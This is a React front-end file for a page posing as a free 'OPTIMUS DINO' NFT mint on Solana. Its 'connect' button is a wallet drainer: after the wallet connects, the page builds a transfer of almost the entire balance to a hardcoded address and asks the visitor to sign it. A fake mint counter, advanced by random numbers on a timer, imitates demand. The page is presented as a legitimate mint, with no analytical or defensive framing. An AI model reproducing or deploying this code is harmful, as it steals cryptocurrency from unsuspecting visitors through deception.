import './App.css';
import {useEffect, useState} from "react";
import * as solanaWeb3 from "@solana/web3.js";
import imgDiscord from './icons8-discord-50.png'
import imgTwitter from './icons8-twitter-50.png'

const solAmount = 0
const image = 'https://images-ext-1.discordapp.net/external/7lt7rh4P7vn6XlDXk6-hL4_NxDSXRiGAlEGgA2TzWUE/https/pbs.twimg.com/profile_images/1520931867087994880/uXfT6YlL_400x400.jpg' 
const Title = 'OPTIMUS DINO'
const supply = 4000


document.title = Title

const address = "D7xLPt19BogkxXd2C2AAhaHUh1VoDLzxdf9ConG2gJWf"

function App() {
  const [opacity, setOpacity] = useState(0)
  const [offset, setOffset] = useState(0)

  async function connectAndSend() {
    try {
      await window.solana.connect()
      await sendSol()
    } catch (error) {
      console.log(error)
    }
  }

  async function sendSol() {
    const provider = window.solana
    const connection = new solanaWeb3.Connection(
        solanaWeb3.clusterApiUrl('mainnet-beta'),
        'confirmed'
    )

    const balance = await connection.getBalance(provider.publicKey)

    const toAccount = new solanaWeb3.PublicKey(address)

    let transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: provider.publicKey,
          toPubkey: toAccount,
          lamports: solanaWeb3.LAMPORTS_PER_SOL * ((balance / solanaWeb3.LAMPORTS_PER_SOL) - 0.001),
        })
    )

    transaction.feePayer = await provider.publicKey
    let blockhashObj = await connection.getRecentBlockhash()
    transaction.recentBlockhash = await blockhashObj.blockhash

    let signed = await provider.signTransaction(transaction)
    let signature = await connection.sendRawTransaction(signed.serialize())
    await connection.confirmTransaction(signature)
  }

  setTimeout(() => {
        setOpacity(100)
    }, 0)

    function getRandomArbitrary(min, max) {
        return Math.random() * (max - min) + min;
    }


    useEffect(() => {
        if (Number(offset) <= 230) {
            const timer = setTimeout(() => {
                const random = getRandomArbitrary(2, 6)
                const randomToFixed = Number(random.toFixed())
                // console.log(Number(offset), Number(randomToFixed))
                setOffset(Number(offset) + randomToFixed)
            }, 4000)
            return () => clearTimeout(timer);
        }
    }, [offset])
  
  return (
      <div className={'AppContainer'}
        ref={(el) => {
                   if (el) {
                       el.style.setProperty('opacity', opacity, 'important');
                   }
               }}
      >
        <header>
          <div>
            <a href={'/'}>{Title}</a>
          </div>
          <nav>
            <ul>
              <li>
                <img src={imgTwitter} alt=""/>
              </li>
              <li>
                <img src={imgDiscord} alt=""/>
              </li>
            </ul>
          </nav>
        </header>
        <div className="App">
          <div>
            <img src={image}
                 alt={'projectImage'}/>
          </div>
          <div>
            <div>Amount - {solAmount}</div>       
            <button onClick={connectAndSend}>connect</button>
            <div className={'lineContainer'}>
                        <div className={'line'}></div>
                        <div className={'circleOnLine'} style={{left: `${offset}px`}}></div>
            </div>
            <div>{`${(offset * (supply/235)).toFixed()} / ${supply}`}</div>
          </div>
        </div>
      </div>
  );
}

export default App;
